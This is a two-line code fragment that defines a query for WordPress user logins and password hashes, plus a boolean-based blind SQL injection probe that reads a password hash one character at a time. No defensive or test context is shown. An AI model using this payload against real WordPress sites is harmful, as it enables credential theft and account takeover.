query = 'SELECT user_login,user_pass FROM wp_users'
probe = '1 AND ASCII(SUBSTRING(user_pass,1,1)) > 32'
